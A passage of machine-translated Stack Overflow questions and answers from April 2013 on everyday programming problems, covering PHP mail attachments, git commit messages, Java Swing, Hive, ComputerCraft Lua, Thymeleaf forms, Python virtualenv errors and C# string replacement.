      Content-Type: multipart/alternative; boundary='PHP-alt-$random_hash'
      --PHP-alt-$random_hash
      Content-Type: text/plain; charset='iso-8859-1'
      Content-Transfer-Encoding: 7bit

      Hello World!
      This is the simple text version of the email message.

      --PHP-alt-$random_hash
      Content-Type: text/html; charset='iso-8859-1'
      Content-Transfer-Encoding: 7bit

      <h2>Hello World!</h2>
      <p>This is the <b>HTML</b> version of the email message.</p>

      --PHP-alt-$random_hash--

      --PHP-mixed-$random_hash
      Content-Type: application/zip; name=screenshot.rar
      Content-Transfer-Encoding: base64
      Content-Disposition: attachment

      $attachment
      --PHP-mixed-$random_hash--";

      echo @mail($to, $subject, $output, $headers);

    ?> 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-20T16:25:13.963

PHP Mailer 是解决这个问题的最佳选择。试试看。[点击这里](http://phpmailer.worxware.com/?pg=tutorial)

前任：

```
<?php
require 'class.phpmailer.php';
$mail = new PHPMailer;
$mail->IsSMTP();                                      // Set mailer to use SMTP
$mail->Host = 'smtp1.example.com;smtp2.example.com';  // Specify main and backup server
$mail->SMTPAuth = true;                               // Enable SMTP authentication
$mail->Username = 'jswan';                            // SMTP username
$mail->Password = 'secret';                           // SMTP password
$mail->SMTPSecure = 'tls';                            // Enable encryption, 'ssl' also accepted
$mail->From = 'from@example.com';
$mail->FromName = 'Mailer';
$mail->AddAddress('josh@example.net', 'Josh Adams');  // Add a recipient
$mail->AddAddress('ellen@example.com');               // Name is optional
$mail->AddReplyTo('info@example.com', 'Information');
$mail->AddCC('cc@example.com');
$mail->AddBCC('bcc@example.com');

$mail->WordWrap = 50;                                 // Set word wrap to 50 characters
$mail->AddAttachment('/var/tmp/file.tar.gz');         // Add attachments
$mail->AddAttachment('/tmp/image.jpg', 'new.jpg');    // Optional name
$mail->IsHTML(true);                                  // Set email format to HTML

$mail->Subject = 'Here is the subject';
$mail->Body    = 'This is the HTML message body <b>in bold!</b>';
$mail->AltBody = 'This is the body in plain text for non-HTML mail clients';

if(!$mail->Send()) {
   echo 'Message could not be sent.';
   echo 'Mailer Error: ' . $mail->ErrorInfo;
   exit;
}
echo 'Message has been sent';
?> 
```

这是 phpmailer 提供的示例代码。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-20T16:05:01.257

[Zend_Mail](http://framework.zend.com/manual/1.12/en/zend.mail.html)库非常适合这个。库是精确编写的，因此您所处情况的人不必从头开始创建这些包，利用它们。

文档非常好（上面链接），您只需下载 Zend Framework 并将其包含在您`include_files`的 php.ini 中。

# git - 如何从命令行同时使用“消息”和“描述”提交更改？

> ID：16122234
> 
> 赞同：505
> 
> 时间：2013-04-20T15:50:37.963
> 
> 标签：git, github

我对这两个`git`和 GitHub 都是新手。我设法在我的 Mac 上本地设置了所有内容，因此现在我可以通过`git`（在命令行上，而不是在 Mac 应用程序上）将提交推送到 GitHub。

当我直接从 GitHub Web 界面推送提交时（例如快速修复错字），我有机会“评论”提交，GitHub 给了我提交*标题*和提交*描述*。我觉得这非常有用。

尽管如此，当我`git push`从本地机器上`git`打开我的默认编辑器时：所以我写了提交评论，然后 GitHub 自动将它分为标题和“正文”。有没有办法从终端进行漂亮的评论提交？

* * *

## 回答 #1

> 赞同：1012
> 
> 时间：2014-04-07T10:01:15.137

还有另一种更直更清晰的方式

```
git commit -m "Title" -m "Description .........."; 
```

* * *

## 回答 #2

> 赞同：471
> 
> 时间：2016-04-05T13:15:40.107

使用`git commit`不带任何标志的命令。配置的编辑器将打开（在本例中为 Vim）：

[![在此处输入图像描述](https://i.stack.imgur.com/f80ai.png)](https://i.stack.imgur.com/f80ai.png)

要开始输入，请按`INSERT`键盘上的键，然后在插入模式下创建一个更好的提交，并描述你想要的方式。例如：

[![在此处输入图像描述](https://i.stack.imgur.com/PQBK3.png)](https://i.stack.imgur.com/PQBK3.png)

写完所有需要的内容后，要返回 git，首先应该退出插入模式，然后按`ESC`。现在通过在键盘上输入`:wq`（w - 写，q - 退出）关闭 Vim 编辑器并保存更改：

[![在此处输入图像描述](https://i.stack.imgur.com/CcACY.png)](https://i.stack.imgur.com/CcACY.png)

并按`ENTER`。

在 GitHub 上，此提交将如下所示：

[![在此处输入图像描述](https://i.stack.imgur.com/qK47K.png)](https://i.stack.imgur.com/qK47K.png)

作为提交编辑器，您可以使用[**VS Code**](https://code.visualstudio.com)：

```
git config --global core.editor "code --wait" 
```

来自 VS Code 文档网站：**[VS Code as Git 编辑器](https://code.visualstudio.com/docs/editor/versioncontrol#_vs-code-as-git-editor)**

动图演示：[![在此处输入图像描述](https://i.stack.imgur.com/pd4eq.gif)](https://i.stack.imgur.com/pd4eq.gif)

* * *

## 回答 #3

> 赞同：67
> 
> 时间：2013-04-20T15:53:40.433

```
git commit -a -m "Your commit message here" 
```

将使用提交消息快速提交所有更改。Git 提交的“标题”和“描述”（正如你所说的那样）只不过是第一行，提交消息中的其余行，按照惯例，通常用空行分隔。所以使用这个命令只会提交“标题”而没有描述。

如果你想提交更长的消息，你可以这样做，[但这取决于你使用的 shell](https://stackoverflow.com/questions/5064563/add-line-break-to-git-commit-m-from-command-line)。

在 bash 中，快速的方法是：

```
git commit -a -m $'Commit title\n\nRest of commit message...' 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2015-12-09T09:43:41.043

如果您想在创建提交后改进带有标题和正文的提交消息，您可以[改写](https://help.github.com/articles/about-git-rebase/#commands-available-while-rebasing)它。这种方法更有用，因为您只有在编写代码之后才知道代码的作用。

```
git rebase -i origin/master 
```

然后，您的提交将出现：

```
pick e152ce2 Update framework
pick ffcf91e Some magic
pick fa672e1 Update comments 
```

选择要改写并保存的提交。

```
pick e152ce2 Update framework
reword ffcf91e Some magic
pick fa672e1 Update comments 
```

现在，您有机会添加标题和正文，第一行将是标题。

```
Create perpetuum mobile

Redesign laws of physics with a pinch of imagination. Open a wormhole in 23 dimensions. Add protection to avoid high instability. 
```

# java - 创建和覆盖形状以适应 JPanel？

> ID：16122235
> 
> 赞同：2
> 
> 时间：2013-04-20T15:50:43.410
> 
> 标签：java, swing, jframe, jcomponent

在这个程序中，创建了一个多边形以显示在`JPanel`选项卡中。

为了让它显示，我必须覆盖形状并为其创建一个 setter 方法。不幸的是，它没有显示，程序也没有运行。

错误：

> 线程“main”中的异常 java.lang.IllegalArgumentException：
>   在 SelectShape 组件 1 = new SelectShape(x, y, vert) 处向容器添加窗口；在方法 Page1 中。

唯一可行的方法是制作一个框架并移除 JTab 并将形状分配到框架上，但这不是我想要的。我想制作一个程序，可以使用一种图形方法将形状分配到*不同的选项卡*。

这是代码：

```
import java.awt.*;
import java.io.IOException;
import javax.swing.*;

/* This program create a graphics component that draws a polygon 
 */
public class SelectShape extends JFrame 
{
    private JTabbedPane tabbedPane;
    private JPanel panel1; 

    // //////////////////////////

    static int[] x = { 20, 40, 50, 65, 80, 95 }; // Co-ords for a polygon
    static int[] y = { 60, 105, 105, 110, 95, 95 };
    static int vert = 6;

    public SelectShape() throws IOException // Builds GUI
    {
        setTitle("Program");
        setSize(900, 600);
        setBackground(Color.gray);

        JPanel topPanel = new JPanel();
        topPanel.setLayout(new BorderLayout());
        getContentPane().add(topPanel);

        // Create the tab pages
        createPage1();

        // Create a tabbed pane
        tabbedPane = new JTabbedPane();
        tabbedPane.addTab("Shape Panel", panel1);
    }

    public void createPage1() throws IOException // Creates JPanel
    {
        panel1 = new JPanel();
        panel1.setLayout(null);

        SelectShape component1 = new SelectShape(x, y, vert); //error
        SelectShape component2 = new SelectShape(x, y, vert); //over-rides shape

        component1.setBounds(290, 70, 120, 40);
        component2.setBounds(290, 70, 120, 40);

        panel1.add(component1); // is not displayed!
        panel1.add(component2); // component2 overwrites component1!!!
        panel1.setVisible(true);

    }

    // overrides javax.swing.JComponent.paintComponent
    public void paintComponent(Graphics g) {
        // Recover Graphics2D
        Graphics2D g2 = (Graphics2D) g;

        // Construct a polygon then draw it
        Polygon polygon = new Polygon(x, y, vert); 
        g2.draw(polygon);
        g2.fill(polygon);
    }

    public SelectShape(int[] x, int y[], int vert) { // setter method
        this.x = x;
        this.y = y;
        this.vert = vert;
    }

    public static void main(String[] args) throws IOException {

        SelectShape mainFrame = new SelectShape(); //Frame
        mainFrame.setVisible(true);

    }
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-22T08:28:27.407

我认为您在代码中将许多概念混合在一起，最终导致无法理解的代码。

*   `JFrame`没有扩展`JComponent`，也没有`paintComponent`方法。考虑`@Override`在覆盖另一个方法的方法上使用注释。这会让你很容易犯这样的错误。
*   无论如何都不需要扩展`JFrame`，并且永远不会覆盖`paint()`顶级容器的方法（`JDialog`，，`JFrame`...）
*   总是调用方法的超级`paintXXX`方法
*   `public SelectShape(int[] x, int y[], int vert) { // setter method`不是setter方法。它是一个构造函数，接受 3 个参数并分配它们。在所有情况下，这对您的情况绝对没有任何作用，因为您制作了这些变量`static`。如果你描述常量，避免使用`static`除非，在这种情况下，它也应该跟`final`关键字。
*   在事件调度线程 (EDT) 上启动 UI，并对 UI 执行所有修改。这可以通过使用轻松完成`SwingUtilities.invokeLater()`。
*   您看到的错误：*线程“main”中的异常 java.lang.IllegalArgumentException：将窗口添加到容器*被抛出，因为您试图将 a 添加`JFrame`到`JComponent`被禁止的 a。`JFrame`不能添加到任何东西。如果你想这样做，你需要使用`JDesktopPane`和添加`JInternalFrame`（但这是另一回事）。

我不太确定您要实现的目标，但这是从您的代码派生的工作代码，效果更好：

```
import java.awt.Color;
import java.awt.Dimension;
import java.awt.Graphics;
import java.awt.Graphics2D;
import java.awt.Polygon;
import java.awt.Rectangle;
import java.awt.Shape;
import java.awt.geom.Ellipse2D;
import java.io.IOException;

import javax.swing.JFrame;
import javax.swing.JPanel;
import javax.swing.JTabbedPane;
import javax.swing.SwingUtilities;

/* This program create a graphics component that draws a polygon 
 */
public class SelectShape extends JPanel {

    // Constants
    private static final int[] x = { 20, 40, 50, 65, 80, 95 }; // Co-ords for a polygon
    private static final int[] y = { 60, 105, 105, 110, 95, 95 };

    private static final Polygon POLYGON = new Polygon(x, y, Math.min(x.length, y.length));
    private static final Ellipse2D CIRCLE = new Ellipse2D.Double(100, 40, 45, 45);

    // Class variables
    private final Shape shape;
    private Dimension preferredSize;

    public SelectShape(Shape shape) {
        this.shape = shape;
        Rectangle bounds = shape.getBounds();
        this.preferredSize = new Dimension(bounds.x + bounds.width, bounds.y + bounds.height);
    }

    @Override
    public Dimension getPreferredSize() {
        return preferredSize;
    }

    @Override
    public void paintComponent(Graphics g) {
        super.paintComponent(g);
        Graphics2D g2 = (Graphics2D) g;
        g.setColor(Color.BLUE);
        g2.draw(shape);
        g2.fill(shape);
    }

    public static void main(String[] args) throws IOException {
        SwingUtilities.invokeLater(new Runnable() {
            @Override
            public void run() {
                JFrame mainFrame = new JFrame("Program");
                mainFrame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
                SelectShape polygon = new SelectShape(POLYGON);
                SelectShape circle = new SelectShape(CIRCLE);
                // Create a tabbed pane
                JTabbedPane tabbedPane = new JTabbedPane();
                tabbedPane.addTab("Polygon", polygon);
                tabbedPane.addTab("Circle", circle);
                mainFrame.add(tabbedPane);
                mainFrame.pack();
                mainFrame.setVisible(true);
            }
        });

    }
} 
```

# string - 在 Hive 中将字段从字符串中分离出来

> ID：16122236
> 
> 赞同：3
> 
> 时间：2013-04-20T15:50:43.653
> 
> 标签：string, input, hive, field

我有以下问题......我使用 Hive 并希望添加一个包含几行（不同）字符串的文件。这些包含具有固定大小的字段，如下所示：

```
A20130420bcd   34  fgh 
```

其中字段的长度为 1,8,6,4,3。分开它看起来像这样：

"A,20130420,bcd,fgh"

除了将它作为每个字段的子字符串之外，是否有可能读取字符串并将其排序到一个字段中，例如

```
substring(col_value,1,1) Field1 
```

ETC？我想切割字符串的已读部分会提高性能，但我可以想出任何方法来使用[这里](https://cwiki.apache.org/confluence/display/Hive/LanguageManual+UDF#LanguageManualUDF-StringFunctions)的给定函数来做到这一点。

其次，如前所述，有不同类型的字符串，由第一个字符排序和标识。现在只需使用 WHERE 语句检查这些字符串，但这很可怕，因为它遍历整个文件只是为了找到第一个字符串. 有什么方法可以通过编号读取特定行吗？如果我知道，第一个字符串将是某种类型，可以直接读取吗？

对，它看起来像这样：

```
insert overwrite table TEST 
SELECT 
substring(col_value,1,1) field1, 
... 
substring(col_value,10,3) field 5 
from temp_data WHERE substring(col_value,1,1) = 'A'; 
```

对此有什么想法吗？

我很想听听一些想法=）

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2014-03-13T08:21:49.090

您需要编写输出结构或映射或任何适当的通用 UDF 解析器。你可以参考[输出多值的UDF](http://dev.bizo.com/2012/01/using-genericudfs-to-return-multiple.html)。

然后你可以写

```
insert overwrite table output
select parsed.first, parsed.second
from (
  select parse(taget)
  from input
) parsed
where first='X'; 
```

关于第二个问题，你可能需要检查hive的“解释”命令，看看hive是否为你做过滤下推。（看看需要多少地图减少，理论上应该是一张地图，取决于1.hive版本, 2.输出表格式。）

一般来说，这就是数据库受欢迎的原因——为您考虑优化。

# variables - 如何在 lua 中使用命令行参数调用表

> ID：16122239
> 
> 赞同：0
> 
> 时间：2013-04-20T15:51:02.813
> 
> 标签：variables, lua, lua-table, computercraft

我正在尝试制作一个可以在某些条件下运行程序的程序。基本上，我将 ComputerCraft 与 Minecraft 和一只乌龟一起使用来检索物品，然后回到它开始的地方。正如您在代码中看到的那样，我将所有坐标单独存储在表格中。但是每次我运行它时，它都不起作用，因为 goto 程序的用法不正确。发生的情况是没有正确调用带有坐标的表，我不知道该怎么做。goto 命令的用法如下`goto <x> <y> <z> [f]`：X、Y 和 Z 是坐标，f 是方向。这是代码的pastebin：http: [//pastebin.com/i73w0S1m](http://pastebin.com/i73w0S1m)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-20T16:05:27.450

```
local tArgs = {...}
if not tArgs[1] then
  print("Usage: request <item name> <amount>")
  return
end
local currentPOS = {gps.locate()}
local im = peripheral.wrap("left")
local all_items = {
  diamond = { -300, 64, -190, 1 },
  cobble = { -300, 65, -190, 1 },
  ...
  brass = { -299, 66, -189, 0 },
  copper = { -299, 67, -189, 0 },
}
shell.run("goto", unpack(all_items[tArgs[1]]))
im.suck(0, tArgs[2])
shell.run("goto", unpack(currentPOS)) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2016-12-12T22:47:30.760

好的，这样就可以了，这对我有用=）好吧，我不知道处理器代码，但我只是修复了使用代码=）

```
 local tArgs = {...}
    function usage() 
    print("Usage: request <item name> <amount>")
      return
    end
    if #tArgs < 1 then
      usage()
    else
    if #tArgs > 2 then
    usage()
    else 
    local currentPOS = {gps.locate()}
    local im = peripheral.wrap("left")
    local all_items = {
      diamond = { -300, 64, -190, 1 },
      cobble = { -300, 65, -190, 1 },
      ...
      brass = { -299, 66, -189, 0 },
      copper = { -299, 67, -189, 0 },
    }
    shell.run("goto", unpack(all_items[tArgs[1]]))
    im.suck(0, tArgs[2])
    shell.run("goto", unpack(currentPOS))
    end
    end 
```

好了，希望它有效 =D XD 对不起，我不小心编辑了 Egor Skriptunoff 代码 XD

# java - jodatime和prettytime哪个更好

> ID：16122243
> 
> 赞同：2
> 
> 时间：2013-04-20T15:51:19.377
> 
> 标签：java, date, time, jodatime, period

对于那些使用过时间处理库的人，我想问一下哪个最好（jodatime 或 prettytime）。

我正在开发一个主要要求的应用程序，计算自特定日期以来已经过去了多少天（或几个月或几分钟，根据期间的长度）。

那么，我应该使用这些库中的哪一个？根据您的经验，哪个更好？哪个更容易？我应该检查另一个特定的库吗？

非常感谢。

PD。prettytime 没有标签，这就是为什么我只使用 jodatime 标签。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-20T15:55:37.833

它们是非常不同的库。对于 dateTime 管理（在日历类型之间切换、计算持续时间等），Joda Time 是您的库。对于人类可读的时间格式（“5 分钟前”），您将使用 prettyTime。我实际上在我的网络应用程序中使用 Jdoa 时间和 moment.js 进行格式化。

# php - 你用什么工具来记录一个大项目？

> ID：16122244
> 
> 赞同：1
> 
> 时间：2013-04-20T15:51:30.500
> 
> 标签：php, documentation, project

我正在和朋友一起做一个项目。这个项目变大了，有很多类、方法、函数、助手等等。

我觉得需要一些可以帮助我们阅读其他代码的东西。该项目建立在公共框架（laravel）上，它是MVC。

您是否使用可以帮助您解决此问题的工具？该代码已记录在案，但我认为阅读每个文件以了解其工作原理有点困难。

谢谢你。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-20T16:01:18.563

[phpDoc](http://en.wikipedia.org/wiki/PHPDoc)会有所帮助，您可以在每个函数之前设置注释，如下所示：

```
/**
 * Returns a user's e-mail address
 * 
 * @param int $userId
 * @return string
 */ 
```

大多数主要 IDE 都会读取这些内容，因此您可以在通过代码完成调用函数时看到返回类型。

# actionscript-3 - 文本框不会在 Flash AS3 中更新

> ID：16122245
> 
> 赞同：0
> 
> 时间：2013-04-20T15:51:42.927
> 
> 标签：actionscript-3, flash, textbox

我在 AS3 中制作了一个非常简单的 JRPG 战斗系统。我有一个名为输出的文本框，用于显示战斗事件。字体是嵌入的（我检查了十几次）。它是黑色背景上的白色文本。显示初始文本，但之后不会更新。我设置了代码来跟踪正在发生的事情，并且显示正确。我究竟做错了什么？谢谢。

这是代码（显然这不完整）：

```
function BattleSystem():void
        {
            //add battle system event listeners
            stage.addEventListener(KeyboardEvent.KEY_DOWN,onKeyDown);
            stage.addEventListener(KeyboardEvent.KEY_UP, onKeyUp);

            //initialize battle
            this.gotoAndStop(2);
            battleStart = true;
            playerAtks = false;
            output.text = ""
            output.text = "A dangerous " + _enemyName + " threatens to attack! What will you do? 1\. Attack 2\. Spells 3\. Items ";

            function onKeyDown(event:KeyboardEvent):void
                {           

                    if (event.keyCode == Keyboard.NUMBER_1)
                    {
                        playerDmg = uint(_Str * ((Math.random() + 1)) - _enemyDef);
                    }
                }
            function onKeyUp(event:KeyboardEvent):void
            {
                if (event.keyCode == Keyboard.NUMBER_1)
                {
                    trace("You deal " + playerDmg + " damage to the " + _enemyName + "!")
                    output.text = "You deal " + playerDmg + " damage to the " + _enemyName + "!";
                }
            }
        } 
```

例如，当前当我进入战斗时，输出显示“一个危险的史莱姆威胁要攻击！你会做什么？1.攻击 2.法术 3.物品”。但是当我点击 1 时，输出不会改变。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-20T17:32:22.457

您将事件处理程序封装在函数中，这是不对的。

尝试这个 ：

```
function BattleSystem():void
{
     //add battle system event listeners
     stage.addEventListener(KeyboardEvent.KEY_DOWN,onKeyDown);
     stage.addEventListener(KeyboardEvent.KEY_UP, onKeyUp);

     //initialize battle
     this.gotoAndStop(2);
     battleStart = true;
     playerAtks = false;
     output.text = ""
     output.text = "A dangerous " + _enemyName + " threatens to attack! What will you do? 1\. Attack 2\. Spells 3\. Items ";

}

function onKeyDown(event:KeyboardEvent):void
{           

      if (event.keyCode == Keyboard.NUMBER_1)
      {
          playerDmg = uint(_Str * ((Math.random() + 1)) - _enemyDef);
      }
}

function onKeyUp(event:KeyboardEvent):void
{
    if (event.keyCode == Keyboard.NUMBER_1)
    {
         trace("You deal " + playerDmg + " damage to the " + _enemyName + "!")
         output.text = "You deal " + playerDmg + " damage to the " + _enemyName + "!";
     }
} 
```

# python - 使用 python2.7 在 Windows 8 上安装 python2.4 virtualenv - 错误 base64.py

> ID：16122248
> 
> 赞同：1
> 
> 时间：2013-04-20T15:52:05.583
> 
> 标签：python, windows, virtualenv

我在 python2.7 窗口上安装 Python2.4 virtualenv 时遇到问题。

我为我的 python2.7 程序创建了一个 virtualenv，并想为我的 python2.4 程序构建 virtualenv

所以我首先 DL 并在我的 windows8 上安装 python2.4 没有问题...文件夹 c:/Python24 （python 2.7 在 c:/Python27 上）

在外壳上

```
 D:\xxx\projet_django>virtualenv --python=c:/Python24/python.exe env_python2
.4
Running virtualenv with interpreter c:/Python24/python.exe
'import site' failed; use -v for traceback
Traceback (most recent call last):
  File "C:\Python27\lib\site-packages\virtualenv.py", line 10, in ?
    import base64
  File "C:\Python27\Lib\base64.py", line 346
    with open(args[0], 'rb') as f:
            ^
SyntaxError: invalid syntax 
```

所以我尝试

```
C:\>cd Python24

C:\Python24>python
'import site' failed; use -v for traceback
Python 2.4.3 (#69, Mar 29 2006, 17:35:34) [MSC v.1310 32 bit (Intel)] on win32
Type "help", "copyright", "credits" or "license" for more information.
>>> import base64
Traceback (most recent call last):
  File "<stdin>", line 1, in ?
  File "C:\Python27\Lib\base64.py", line 346
    with open(args[0], 'rb') as f:
            ^ 
```

所以问题是 base64.py 使用 WITH fonction 在 python2.4 上不存在......那么为什么我的 python2.7 virtualenv 尝试使用 python2.4 来安装我的 virtualenv ？

我现在能做什么？谢谢劳伦

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-21T10:23:24.447

问题是 Python 2.4 安装不正确：当你启动它时，它不应该尝试从`C:\Python27\Lib\`. 我无法告诉更多问题出在哪里，但如果有必要，您应该能够通过从官方安装程序从头开始重新安装 Python 2.4 来解决这个问题。

**编辑：**另外，请注意 PYTHONPATH 环境变量。也许它指向`C:\Python27`. 这是个坏主意:-)

# c++ - 调试程序运行时 Direct3D11 发出声音

> ID：16122251
> 
> 赞同：3
> 
> 时间：2013-04-20T15:52:25.730
> 
> 标签：c++, direct3d11

我有一个简单的块旋转应用程序（基本上是一个 d3d11 Hello World！），但每当我运行它时，我都能听到声音。

我试图单步执行代码以查看使噪音“发生”的调用，但我无法在任何 D3Dinit 中找到它。

这是我用来初始化的代码：

```
 HRESULT hr = D3D11CreateDevice(
        0,                 // default adapter
        md3dDriverType,
        0,                 // no software device
        createDeviceFlags, 
        0, 0,              // default feature level array
        D3D11_SDK_VERSION,
        &md3dDevice,
        &featureLevel,
        &md3dImmediateContext); 
```

这是我附加接口并创建交换缓冲区的地方（注意 HR() 只是一个宏，如果打开调试，它将显示 HRESULTS）

```
 IDXGIDevice* dxgiDevice = 0;
HR(md3dDevice->QueryInterface(__uuidof(IDXGIDevice), (void**)&dxgiDevice));

IDXGIAdapter* dxgiAdapter = 0;
HR(dxgiDevice->GetParent(__uuidof(IDXGIAdapter), (void**)&dxgiAdapter));

IDXGIFactory* dxgiFactory = 0;
HR(dxgiAdapter->GetParent(__uuidof(IDXGIFactory), (void**)&dxgiFactory));

HR(dxgiFactory->CreateSwapChain(md3dDevice, &sd, &mSwapChain)); 
```

有谁知道什么会导致这种可听见的噪音发生？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2014-01-03T23:43:32.577

当帧速率非常高时，我在某些显卡上注意到了这一点。启用垂直同步通常会消除这种声音。

[http://www.techpowerup.com/forums/threads/whine-from-gpu-under-high-frame-rate.157681/](http://www.techpowerup.com/forums/threads/whine-from-gpu-under-high-frame-rate.157681/)

很难在视频中听到，但很明显

[http://www.youtube.com/watch?v=3ibkMvhMlgs](http://www.youtube.com/watch?v=3ibkMvhMlgs)

# java - 在不使用扫描仪的情况下在控制台中获取用户的输入

> ID：16122256
> 
> 赞同：4
> 
> 时间：2013-04-20T15:53:15.273
> 
> 标签：java, java.util.scanner

我想知道使用其他类（例如`BufferedReader`等）而不是使用 Scanner 类从用户那里获取输入的其他方法。那么，有没有其他方法可以从用户那里获取输入？如果是这样，它比`Scanner`上课更有效率吗？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-20T15:59:35.417

如果您使用的是 Java SE6 或更高版本，那么您可以使用`Console`clas

```
 Console console = System.console();
   if (console==null){
      System.out.print("console not available ");
   }else {
      String line = console.readLine("Enter name :");
      System.out.print("your name :"+line);
   } 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-04-20T16:26:41.993

您可以通过以下步骤简单地做到这一点：

1.  使用`BufferedReader`Class 并用 Class 包装它`InputStreamReader`。

    ```
    BufferedReader br = new BufferedReader(new InputStreamReader(System.in))
    //string str = br.readLine(); //for string input
    int i = Integer.parseInt(br.readLine()); // for Integer Input 
    ```

2.  现在由于该`readLine`方法抛出一个`IOException`你需要抓住它。整个代码将如下所示：

    ```
    try {
        BufferedReader br = new BufferedReader(new InputStreamReader(System.in))
        //string str = br.readLine();     //for string input
        int i = Integer.parseInt(br.readLine()); // for Integer Input
    } catch(IOException ioe) {
        ioe.PrintStackTrace();
    } 
    ```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2013-04-20T15:59:40.200

可以`System.in`直接使用，如下：

```
BufferedReader r = new BufferedReader(new InputStreamReader(System.in));
String line;
while ((line = r.readLine()) != null) {
    System.out.println(line);
} 
```

虽然这可能比使用 快一点`Scanner`，但它不是一个苹果对苹果的比较：`Scanner`提供更多的方法来标记输入，同时`BufferedReader`可以将你的输入分成几行，而不用标记它。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2013-04-20T15:59:11.640

用这个：

```
BufferedReader stdin = new BufferedReader(new InputStreamReader(System.in)); 
```

来创建一个阅读器`System.in`，你可以使用`stdin.readLine()`或其他东西来获得你想要的东西。

使用 a`BufferedReader`比使用 a 更有效`Scanner`。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2014-08-15T15:19:21.803

例如这里...

```
InputStreamReader inStream = new InputStreamReader(System.in);
BufferedReader stdin = new BufferedReader(inStream);

int num , num2;
String str[]=new String[2];

System.out.print("Please Enter Your First Number:");
str[0] = stdin.readLine();
System.out.print("Please Enter Your Second Number:");
str[1] = stdin.readLine();

num = Integer.parseInt(str[0]);
num2 = Integer.parseInt(str[1]); 
```

* * *

## 回答 #6

> 赞同：-2
> 
> 时间：2015-04-28T17:00:42.723

> 用户可以在程序执行时输入数据，而无需使用扫描程序类，这可以通过使用以下程序来完成。

```
 class Demo
  { 
   public static void main(String ar[])
    {
     int ab = Integer.parseInt(ar[0]);
     int ba = Integer.parseInt(ar[1]);
     int res = ab+ba;
     System.out.print(res);
    }
  } 
```

> 这是一个基本程序，用户可以在执行时输入数据并获得所需的结果。您可以在 CMD 中对字符串进行加、减、乘、除和连接，用户可以在编译 java 程序后，即在调用类文件时输入数据。您只需要调用类文件，然后在空格后输入数据。

`C:\Users\Lenovo\Desktop>java Demo 5 2`

> 这里 ab= 5 和 ba= 2。如果用户愿意，他可以有任何数字或字符串。

# java - 如何使用 thymeleaf 传递两个对象以在表单中使用？

> ID：16122257
> 
> 赞同：20
> 
> 时间：2013-04-20T15:53:27.577
> 
> 标签：java, html, spring, thymeleaf

我的问题如下：

我必须从一个表单中填写 2 个不同的对象。

使用 1 个对象，我只需在 newFoo.html 中执行：

```
<form th:object="${foo}" th:action="@{/foo}" method="post">
    <input type="text" th:field="*{name}"/>
    <button type="submit">Go</button>
</form> 
```

在 FooController 中：

```
@RequestMapping(value = "/foo/new", method = RequestMethod.GET) 
public String newFoo(final Foo foo, Model model) { 
    return "newFoo"; 
} 

@RequestMapping(value = "/foo/new", method = RequestMethod.POST) 
public String saveFoo(final Foo foo, final BindingResult bindingResult, Model model) { 
    fooService.save(foo); 
    return "redirect:/foo/new"; 
} 
```

假设我有另一个带有“状态”变量的对象栏。如何传递该对象以便我可以在同一个表单中提交输入？

像：

```
<form th:object="${foo} && ${bar}" th:action="@{/foo}" method="post">
    <input type="text" th:field="*{name}"/>
    <input type="text" th:field="*{status}"/>
    <button type="submit">Go</button>
</form> 
```

到目前为止，我尝试使用其中包含 th:object 的字段集，但这不起作用，我尝试在表单中放入两个 th:object，这也不起作用。

我发现的唯一方法是构建一个包含这两个对象的另一个对象，然后传递它。这很好用，但我不能创建那种对象，这是胡说八道（即使它有效）。

当然，这里的对象并不像 Foo 和 Bar 那样简单，否则我会合并这两个。但这不是我能做的。

甚至可以传递两个这样的对象以在表单中使用吗？

已经谢谢了。

* * *

## 回答 #1

> 赞同：31
> 
> 时间：2013-04-20T16:56:04.880

我认为您不需要使用两个`th:objects`. 只需使用`th:value`

```
<form th:action="@{/foo}" method="post">
      <input type="text" th:value="${foo.name}" name="name"/>
      <input type="text" th:value="${bar.status}" name="status"/>
      <button type="submit">Go</button>
</form> 
```

我认为 Spring 在控制器方面足够聪明，可以使用它的映射技术将您的字段映射到它们正确的命令对象 foo 或 bar。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2018-08-05T20:49:17.657

我使用 div 标签来包围我的第二个对象的表单输入，并添加了一个 th:object .....控制器对其进行处理并将其添加到数据库中。

```
<form method=post th:object="${object1}" >
   <div th:object="${object2}" >

      code......

   </div> 
   <input type="submit" />
</form> 
```

# c# - 如何在C#中替换多次出现的子字符串

> ID：16122258
> 
> 赞同：0
> 
> 时间：2013-04-20T15:53:33.033
> 
> 标签：c#, string, replace

我刚开始学习 C#，如果文本没有用空格分隔，我试图用 \ 替换文本文件中某个子字符串的所有出现。最简单的方法是什么？谢谢。

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2013-04-20T16:00:37.853

1.  读入你的文件：

    ```
    var fileContents = System.IO.File.ReadAllText(@"C:\YourFile.txt"); 
    ```

2.  替换文字：

    ```
    fileContents = fileContents.Replace("BACKS", "\\"); 
    ```

3.  将文件写入文件系统：

    ```
    System.IO.File.WriteAllText(@"C:\YourFile.txt", fileContents); 
    ```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-20T16:05:17.350

如果你想使用正则表达式

简单而单一的陈述

```
File.WriteAllText("c:\\test.txt", Regex.Replace(File.ReadAllText("c:\\test.txt"), @"\bBACKS\b", "\\")); 
```

# java - 快速缩放图像，并确保它实际缩放

> ID：16122260
> 
> 赞同：1
> 
> 时间：2013-04-20T15:53:37.527
> 
> 标签：java, swing, scale, bufferedimage, graphics2d

我正在尝试缩放由以下人员拍摄的屏幕截图：

```
